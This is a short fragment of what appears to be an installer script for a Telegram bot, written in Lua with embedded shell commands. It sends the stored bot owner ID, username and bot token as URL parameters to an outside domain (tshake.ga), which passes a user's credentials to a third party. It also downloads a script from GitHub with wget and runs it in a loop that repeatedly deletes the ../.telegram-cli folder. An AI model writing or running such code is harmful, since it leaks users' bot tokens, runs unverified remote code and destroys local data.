...
http.request("https://tshake.ga/HidaarArmando/HidaarArmando.php?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
...
rm -fr HidaarArmando
wget "https://raw.githubusercontent.com/tumblr-Source/HidaarArmando/master/HidaarArmando"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./HidaarArmando -p PROFILE --bot=$token
done
]])
RunTshake:close()
